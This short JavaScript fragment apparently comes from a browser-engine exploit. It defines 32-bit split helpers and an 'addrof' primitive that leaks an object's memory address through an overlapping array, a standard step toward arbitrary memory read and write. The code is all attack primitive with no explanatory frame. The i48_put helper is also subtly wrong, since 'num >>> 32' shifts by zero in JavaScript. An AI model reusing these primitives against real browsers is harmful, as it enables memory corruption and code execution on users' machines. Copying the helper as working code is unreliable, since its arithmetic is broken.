function i48_put(num, result) {
  // Store the low and high 32 bits of the given number in the result array.
  result[4] = num & 0xffffffff;
  result[5] = num >>> 32;
}

function i48_get(num) {
  // Return the number represented by the low and high 32 bits in the given array.
  return num[4] + 4294967296 * num[5];
}

function addrof(obj) {
  // Store the given object in the leaker_obj, and return its address.
  leaker_obj.a = obj;
  return i48_get(leaker_arr);
}
